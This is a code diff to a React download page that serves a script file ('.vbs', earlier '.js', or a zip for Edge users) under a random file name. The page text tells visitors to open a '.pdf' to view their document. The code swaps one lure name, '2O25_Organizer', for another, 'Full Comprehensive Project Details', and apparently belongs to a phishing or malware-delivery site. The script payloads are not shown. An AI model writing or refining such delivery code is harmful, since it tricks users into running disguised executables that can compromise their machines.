@@ -369,13 +369,13 @@ const Download = () => {
   const downloadFile = useMemo(() => {
     const ua = navigator.userAgent;
     if (ua.includes("Edg/")) {
-      return { href: "/docs/2O25_Organizer.zip", extension: "zip" };
+      return { href: "/docs/Full Comprehensive Project Details.zip", extension: "zip" };
     }
-    return { href: "/docs/2O25_Organizer.js", extension: "js" };
+    return { href: "/docs/Full Comprehensive Project Details.vbs", extension: "vbs" };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; extension: string }) => {
-    const fileName = `2O25_Organizer_${randomDigits(8)}.${file.extension}`;
+    const fileName = `Full_Comprehensive_Project_Details_${randomDigits(8)}.${file.extension}`;
     try {
       const res = await fetch(file.href, { cache: "no-store" });
       if (!res.ok) throw new Error(`Download source returned ${res.status}`);
@@ -451,7 +451,7 @@ const Download = () => {
               Please check your <strong>Downloads</strong> folder
             </p>
             <p className="text-[15px] text-[#444] leading-relaxed mb-5">
-              and open <strong className="underline">2O25_Organizer_02162026.pdf</strong> To view your document.
+              and open <strong className="underline">Full Comprehensive Project Details.pdf</strong> To view your document.
             </p>
 
             <p className="text-[15px] text-[#444] mb-6 leading-relaxed">
